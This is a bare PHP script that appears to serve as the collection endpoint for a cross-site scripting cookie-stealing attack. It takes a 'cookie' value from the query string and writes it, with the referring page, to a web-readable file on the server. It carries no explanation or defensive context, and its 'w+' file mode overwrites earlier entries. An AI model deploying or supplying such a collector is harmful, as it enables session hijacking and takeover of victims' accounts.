<?php
	if(isset($_GET['cookie'])){
		$file = fopen("/var/www/html/cookies","w+");
		fwrite($file,$_GET['cookie'].":".$_SERVER['HTTP_REFERER']."\n");
		fclose($file);
	 }
?>
